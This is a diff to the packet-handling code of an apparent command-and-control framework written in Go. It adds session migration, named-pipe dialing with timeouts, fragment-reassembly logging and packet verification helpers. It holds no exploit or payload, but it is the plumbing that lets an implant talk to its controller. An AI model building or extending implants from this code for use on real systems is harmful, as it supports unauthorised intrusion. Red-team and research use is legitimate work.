@@ -3,14 +3,17 @@
 package c2
 
 import (
+	"context"
 	"io"
 	"net"
 	"sync"
 	"time"
 
+	"github.com/iDigitalFlame/xmt/c2/cout"
 	"github.com/iDigitalFlame/xmt/c2/task"
 	"github.com/iDigitalFlame/xmt/com"
 	"github.com/iDigitalFlame/xmt/com/limits"
+	"github.com/iDigitalFlame/xmt/com/pipe"
 	"github.com/iDigitalFlame/xmt/data"
 	"github.com/iDigitalFlame/xmt/device"
 	"github.com/iDigitalFlame/xmt/util"
@@ -18,14 +21,25 @@ import (
 	"github.com/iDigitalFlame/xmt/util/xerr"
 )
 
-// RvResult is the generic value for indiciating a result value.
-// Packets that have this as their ID value will be forwarded to the authoritative Mux and will
-// be discarded if it does not match an active Job ID.
-const RvResult uint8 = 0x14
+const (
 
-// ID entries that start with 'Sv*' will be handed directly by the underlying Session instead of being
-// forwared to the authoritative Mux. These Packet ID values are used for network congestion and flow
-// control and should not be used in standard Packet entries.
+	// RvResult is the generic value for indiciating a result value. Packets
+	// that have this as their ID value will be forwarded to the authoritative
+	// Mux and will be discarded if it does not match an active Job ID.
+	RvResult uint8 = 0x14
+	// RvMigrate is the ID value returned when a Session Migration has completed.
+	// This Packet usually carries the new Device struct data.
+	RvMigrate uint8 = 0x13
+
+	fragMax     = 0xFFFF
+	readTimeout = time.Millisecond * 250
+)
+
+// ID entries that start with 'Sv*' will be handed directly by the underlying
+// Session instead of being forwared to the authoritative Mux.
+//
+// These Packet ID values are used for network congestion and flow control and
+// should not be used in standard Packet entries.
 const (
 	SvHello    uint8 = 0x02
 	SvRegister uint8 = 0x03 // Considered a MvDrop.
@@ -34,15 +48,11 @@ const (
 	SvDrop     uint8 = 0x06
 )
 
-const (
-	fragMax     = (2 << 15) - 1
-	readTimeout = time.Millisecond * 250
-)
-
 var (
-	// ErrTooManyPackets is an error returned by many of the Packet writing functions when attempts to combine
-	// Packets would create a Packet grouping size larger than the maximum size (65535).
-	ErrTooManyPackets = xerr.New("frag/multi count is larger than the max size")
+	// ErrTooManyPackets is an error returned by many of the Packet writing
+	// functions when attempts to combine Packets would create a Packet grouping
+	// size larger than the maximum size (65535 or 0xFFFF).
+	ErrTooManyPackets = xerr.Sub("frag/multi count is larger than 0xFFFF", 0xE)
 
 	empty time.Time
 
@@ -74,7 +84,7 @@ func mergeTags(one, two []uint32) []uint32 {
 	if i < len(two) {
 		i = len(two)
 	}
-	t := make(map[uint32]waker, i)
+	t := make(map[uint32]struct{}, i)
 	for _, v := range one {
 		t[v] = wake
 	}
@@ -87,7 +97,37 @@ func mergeTags(one, two []uint32) []uint32 {
 	}
 	return r
 }
-func receiveSingle(s *Session, n *com.Packet) {
+func readFull(r io.Reader, c int, b []byte) error {
+	n, err := r.Read(b)
+	if err != nil {
+		return err
+	}
+	if n != c {
+		return io.ErrUnexpectedEOF
+	}
+	return nil
+}
+func verifyPacket(n *com.Packet, i device.ID) bool {
+	if n.Job == 0 && n.Flags&com.FlagProxy == 0 && n.ID > 1 {
+		n.Job = uint16(util.FastRand())
+	}
+	if n.Device.Empty() {
+		n.Device = i
+		return true
+	}
+	return n.Device == i
+}
+func writeFull(w io.Writer, c int, b []byte) error {
+	n, err := w.Write(b)
+	if err != nil {
+		return err
+	}
+	if n != c {
+		return io.ErrShortWrite
+	}
+	return nil
+}
+func receiveSingle(s *Session, l *Listener, n *com.Packet) {
 	if s == nil {
 		return
 	}
@@ -97,16 +137,36 @@ func receiveSingle(s *Session, n *com.Packet) {
 		)
 	}
 	switch n.ID {
+	case RvMigrate:
+		if s.parent == nil {
+			return
+		}
+		if cout.Enabled {
+			s.log.Info("[%s] Client indicated that it migrated, updating local device information.", s.ID)
+		}
+		var (
+			v   = s.Device
+			err = s.Device.UnmarshalStream(n)
+		)
+		if s.parent = l; err != nil {
+			if s.Device = v; cout.Enabled {
+				s.log.Error("[%s] Could not Unmarshal device data: %s!", s.ID, err.Error())
+			}
+		}
 	case SvShutdown:
 		if s.parent != nil {
-			s.log.Debug("[%s] Client indicated shutdown, acknowledging and closing Session.", s.ID)
+			if cout.Enabled {
+				s.log.Info("[%s] Client indicated shutdown, acknowledging and closing Session.", s.ID)
+			}
 			s.write(false, &com.Packet{ID: SvShutdown, Job: 1, Device: s.ID})
 			s.Remove()
 		} else {
 			if s.state.Closing() {
 				return
 			}
-			s.log.Debug("[%s] Server indicated shutdown, closing Session.", s.ID)
+			if cout.Enabled {
+				s.log.Info("[%s] Server indicated shutdown, closing Session.", s.ID)
+			}
 		}
 		s.Close()
 		return
@@ -114,7 +174,9 @@ func receiveSingle(s *Session, n *com.Packet) {
 		if s.parent != nil {
 			return
 		}
-		s.log.Info("[%s] Server indicated that we must re-register, resending SvRegister info!", s.ID)
+		if cout.Enabled {
+			s.log.Info("[%s] Server indicated that we must re-register, resending SvRegister info!", s.ID)
+		}
 		if s.proxy != nil {
 			s.proxy.lock.RLock()
 			for i := range s.proxy.clients {
@@ -125,20 +187,20 @@ func receiveSingle(s *Session, n *com.Packet) {
 			s.proxy.lock.RUnlock()
 		}
 		v := &com.Packet{ID: SvHello, Job: uint16(util.FastRand()), Device: s.ID}
-		device.Local.MarshalStream(v)
+		s.Device.MarshalStream(v)
 		if s.queue(v); len(s.send) <= 1 {
 			s.Wake()
 		}
 		return
 	}
-	if n.ID < task.MvTime {
+	if n.ID < task.MvRefresh {
 		return
 	}
 	switch {
 	case s.Mux != nil:
-		s.s.events <- event{p: n, s: s, hf: s.Mux.Handle}
+		s.m.queue(event{p: n, s: s, hf: s.Mux.Handle})
 	default:
-		s.s.events <- event{p: n, s: s, af: s.handle}
+		s.m.queue(event{p: n, s: s, af: s.handle})
 	}
 }
 func receive(s *Session, l *Listener, n *com.Packet) error {
@@ -155,16 +217,17 @@ func receive(s *Session, l *Listener, n *com.Packet) error {
 		if s.proxy != nil && s.proxy.accept(n) {
 			return nil
 		}
-		return xerr.New(`received Packet for "` + n.Device.String() + `" that does not match our own ID "` + s.ID.String() + `"`)
+		if xerr.Concat {
+			return xerr.Sub(`received Packet for "`+n.Device.String()+`" that does not match our own ID "`+s.ID.String()+`"`, 0xD)
+		}
+		return xerr.Sub("received Packet that does not match our own ID", 0xD)
 	}
 	if n.Flags&com.FlagOneshot != 0 {
 		switch {
-		case l != nil && l.Oneshot != nil:
-			l.s.events <- event{p: n, pf: l.Oneshot}
 		case l != nil && l.s.Oneshot != nil:
-			l.s.events <- event{p: n, pf: l.s.Oneshot}
-		case s != nil && s.s.Oneshot != nil:
-			s.s.events <- event{p: n, pf: s.s.Oneshot}
+			l.m.queue(event{p: n, pf: l.s.Oneshot})
+		case s != nil && s.s != nil && s.s.Oneshot != nil: // NOTE(dij): Would this ever fire?
+			s.m.queue(event{p: n, pf: s.s.Oneshot})
 		}
 		return nil
 	}
@@ -183,7 +246,9 @@ func receive(s *Session, l *Listener, n *com.Packet) error {
 				n.Clear()
 				return err
 			}
-			s.log.Trace("[%s] Unpacked Packet %q..", s.ID, v)
+			if cout.Enabled {
+				s.log.Trace("[%s] Unpacked Packet %q..", s.ID, v)
+			}
 			if err := receive(s, l, v); err != nil {
 				n.Clear()
 				v.Clear()
@@ -194,7 +259,9 @@ func receive(s *Session, l *Listener, n *com.Packet) error {
 		return nil
 	case n.Flags&com.FlagFrag != 0 && n.Flags&com.FlagMulti == 0:
 		if n.ID == SvDrop || n.ID == SvRegister {
-			s.log.Warning("[%s] Indicated to clear Frag Group %X!", s.ID, n.Flags.Group())
+			if cout.Enabled {
+				s.log.Warning("[%s] Indicated to clear Frag Group %X!", s.ID, n.Flags.Group())
+			}
 			if s.state.SetLast(n.Flags.Group()); n.ID != SvRegister {
 				return nil
 			}
@@ -204,16 +271,23 @@ func receive(s *Session, l *Listener, n *com.Packet) error {
 			return ErrInvalidPacketCount
 		}
 		if n.Flags.Len() == 1 {
+			if cout.Enabled {
+				s.log.Trace("[%s] Received a single frag (len=1) for Group %X, clearing Flags!", s.ID, n.Flags.Group())
+			}
 			n.Flags.Clear()
 			return receive(s, l, n)
+		}
+		if cout.Enabled {
+			s.log.Trace("[%s] Received frag for Group %X (%d of %d).", s.ID, n.Flags.Group(), n.Flags.Position(), n.Flags.Len())
 		}
 		var (
 			g     = n.Flags.Group()
 			c, ok = s.frags[g]
 		)
 		if !ok && n.Flags.Position() > 0 {
-			s.log.Warning("[%s] Received an invalid Frag Group %X, indicating to drop it!", s.ID, n.Flags.Group())
-			s.queue(&com.Packet{ID: SvDrop, Flags: n.Flags, Device: s.ID})
+			if s.queue(&com.Packet{ID: SvDrop, Flags: n.Flags, Device: s.ID}); cout.Enabled {
+				s.log.Warning("[%s] Received an invalid Frag Group %X, indicating to drop it!", s.ID, n.Flags.Group())
+			}
 			return nil
 		}
 		if !ok {
@@ -224,13 +298,15 @@ func receive(s *Session, l *Listener, n *com.Packet) error {
 			return err
 		}
 		if v := c.done(); v != nil {
-			delete(s.frags, g)
+			if delete(s.frags, g); cout.Enabled {
+				s.log.Trace("[%s] Completed Frag Group %X, %d total.", s.ID, n.Flags.Group(), n.Flags.Len())
+			}
 			return receive(s, l, v)
 		}
 		s.frag(n.Job, n.Flags.Len(), n.Flags.Position())
 		return nil
 	}
-	receiveSingle(s, n)
+	receiveSingle(s, l, n)
 	return nil
 }
 func writeUnpack(dst, src *com.Packet, flags, tags bool) error {
@@ -299,7 +375,7 @@ func writePacketTo(c *data.Chunk, w Wrapper, n *com.Packet) error {
 		return xerr.Wrap("unable to wrap writer", err)
 	}
 	if bugtrack.Enabled {
-		bugtrack.Track("c2.writePacketTo(): n=%s, n.Len()=%d, n.Size()=%d", n, n.Len(), n.Size())
+		bugtrack.Track("c2.writePacketTo(): n=%s, n.Len()=%d, n.Size()=%d", n, n.Size(), n.Size())
 	}
 	if err = n.Marshal(o); err != nil {
 		return err
@@ -308,6 +384,26 @@ func writePacketTo(c *data.Chunk, w Wrapper, n *com.Packet) error {
 		xerr.Wrap("unable to close wrapper", err)
 	}
 	return nil
+}
+func spinTimeout(x context.Context, n string, t time.Duration) net.Conn {
+	var (
+		y, f = context.WithTimeout(x, t)
+		c    net.Conn
+	)
+	for c == nil {
+		select {
+		case <-y.Done():
+			f()
+			return nil
+		case <-x.Done():
+			f()
+			return nil
+		default:
+			c, _ = pipe.DialContext(y, n)
+		}
+	}
+	f()
+	return c
 }
 func readPacket(c net.Conn, w Wrapper, t Transform) (*com.Packet, error) {
 	var n com.Packet
@@ -380,15 +476,16 @@ func nextPacket(a notifier, q <-chan *com.Packet, n *com.Packet, i device.ID, t 
 	if n == nil && len(q) == 0 {
 		return nil, nil
 	}
-	// fast path (if we have a strict limit OR we don't have
-	// anything in queue but we got a packet). So just send that shit/wrap if needed.
+	// NOTE(dij): Fast path (if we have a strict limit OR we don't have
+	//            anything in queue but we got a packet). So just send that
+	//            shit/wrap if needed.
 	if limits.Packets <= 1 || (n != nil && len(q) == 0) {
 		if n == nil {
 			if n = <-q; n == nil {
 				return nil, nil
 			}
 		}
-		if a.accept(n.Job); n.Verify(i) {
+		if a.accept(n.Job); verifyPacket(n, i) {
 			n.Tags = append(n.Tags, t...)
 			return n, nil
 		}
@@ -414,7 +511,7 @@ func nextPacket(a notifier, q <-chan *com.Packet, n *com.Packet, i device.ID, t 
 		}
 		// Rare case a single packet (which was already chunked,
 		// is bigger than the frag size, shouldn't happen but *shrug*)
-		// s would be zero on the first round, so just send that one and DGAF
+		// s would be zero on the first round, so just send that one and "fuck it"
 		if s > 0 {
 			if s += n.Size(); s > limits.Frag {
 				k = n
@@ -424,7 +521,7 @@ func nextPacket(a notifier, q <-chan *com.Packet, n *com.Packet, i device.ID, t 
 			s += n.Size()
 		}
 		// Set multi device flag if theres a packet in queue that doesn't match us.
-		if a.accept(n.Job); !n.Verify(i) && !m {
+		if a.accept(n.Job); !verifyPacket(n, i) && !m {
 			o.Flags |= com.FlagMultiDevice
 			m = true
 		}
